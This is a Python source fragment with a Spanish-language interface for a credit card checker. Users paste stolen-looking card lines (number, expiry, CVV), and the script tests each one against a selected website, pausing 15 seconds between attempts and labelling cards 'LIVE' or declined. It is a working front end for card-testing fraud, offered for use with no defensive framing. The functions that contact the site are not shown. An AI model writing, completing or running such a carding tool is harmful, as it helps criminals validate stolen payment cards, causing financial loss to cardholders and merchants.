def read_cards_multiline():
    """Lee múltiples tarjetas"""
    print(f"{Color.BOLD}{Color.BLUE}{'='*60}{Color.RESET}")
    print(f"{Color.BOLD}{Color.WHITE}PEGA TUS TARJETAS{Color.RESET}")
    print(f"{Color.BOLD}{Color.BLUE}{'='*60}{Color.RESET}")
    print(f"\n{Color.YELLOW}Formato: CC|MM|YYYY|CVV{Color.RESET}")
    print(f"{Color.WHITE}Ejemplo: 4111111111111111|12|2025|123{Color.RESET}\n")
    print(f"{Color.WHITE}Pega las tarjetas (una por linea){Color.RESET}")
    print(f"{Color.WHITE}Enter en linea vacia para terminar{Color.RESET}\n")
    print(f"{Color.BLUE}{'-'*60}{Color.RESET}")
    
    cards_input = []
    while True:
        try:
            line = input()
            if line.strip() == "":
                break
            cards_input.append(line.strip())
        except EOFError:
            break
    
    return cards_input

def parse_cards(cards_input):
    """Parsea las tarjetas"""
    cards = []
    for idx, card_str in enumerate(cards_input, 1):
        try:
            parts = card_str.split('|')
            if len(parts) != 4:
                print(f"{Color.RED}Linea {idx} ignorada (formato inválido): {card_str}{Color.RESET}")
                continue
                
            cc, mm, yy, cvv = parts
            cc = cc.replace(" ", "")
            
            if len(yy) == 2:
                yy = str(2000 + int(yy) if int(yy) < 40 else 1900 + int(yy))
            
            cards.append((cc, mm, yy, cvv))
            
        except Exception as e:
            print(f"{Color.RED}Linea {idx} ignorada (error): {card_str}{Color.RESET}")
    
    return cards

def run_checker():
    """Ejecuta el checker"""
    web = get_current_web()
    print(f"\n{Color.CYAN}🌐 Usando web seleccionada: {web}{Color.RESET}")
    
    try:
        session, current_web = initialize_session(web)
    except SystemExit:
        return
    except Exception as e:
        print(f"{Color.RED}❌ Error al inicializar: {str(e)}{Color.RESET}")
        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
        return
    
    wait_for_double_press()
    
    cards_input = read_cards_multiline()
    
    if not cards_input:
        print(f"\n{Color.RED}No se ingresaron tarjetas{Color.RESET}")
        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
        return
    
    print(f"\n{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}")
    print(f"{Color.BOLD}{Color.WHITE}PROCESANDO TARJETAS...{Color.RESET}")
    print(f"{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}")
    
    cards = parse_cards(cards_input)
    
    if not cards:
        print(f"\n{Color.RED}No hay tarjetas válidas{Color.RESET}")
        input(f"\n{Color.YELLOW}Presiona Enter para continuar...{Color.RESET}")
        return
    
    print(f"\n{Color.GREEN}✓ Tarjetas válidas: {len(cards)}{Color.RESET}")
    print(f"\n{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
    print(f"{Color.BOLD}{Color.WHITE}INICIANDO VERIFICACIÓN{Color.RESET}")
    print(f"{Color.BOLD}{Color.CYAN}{'='*60}{Color.RESET}")
    print(f"{Color.YELLOW}⏱️  Espera de 15 segundos entre verificaciones{Color.RESET}")
    
    time.sleep(0.5)
    
    results = []
    approved = 0
    declined = 0
    errors = 0
    
    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        result = check_card(session, current_web, cc, mm, yy, cvv, idx, len(cards))
        results.append(result)
        
        if result['status'] == 'approved':
            print(f"{Color.BOLD}{Color.GREEN}✅ LIVE ✅ {result['card']} - {result['response']}{Color.RESET}")
            approved += 1
        elif result['status'] == 'declined':
            print(f"{Color.BOLD}{Color.RED}❌ DECLINED ❌ {result['card']} - {result['response']}{Color.RESET}")
            declined += 1
        else:
            print(f"{Color.BOLD}{Color.YELLOW}⚠️  ERROR ⚠️  {result['card']} - {result['response']}{Color.RESET}")
            errors += 1
        
        if idx < len(cards):
            print(f"{Color.CYAN}⏳ Esperando 15 segundos...{Color.RESET}")
            time.sleep(15)
    
    print(f"\n{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}")
    print(f"{Color.BOLD}{Color.WHITE}RESUMEN FINAL{Color.RESET}")
    print(f"{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}")
    print(f"{Color.GREEN}✅ LIVE: {approved}{Color.RESET}")
    print(f"{Color.RED}❌ Declined: {declined}{Color.RESET}")
    print(f"{Color.YELLOW}⚠️  Errores: {errors}{Color.RESET}")
    print(f"{Color.CYAN}📊 Total: {len(cards)}{Color.RESET}")
    print(f"{Color.BOLD}{Color.MAGENTA}{'='*60}{Color.RESET}\n")
    
    input(f"\n{Color.YELLOW}Presiona Enter para volver al menú...{Color.RESET}")

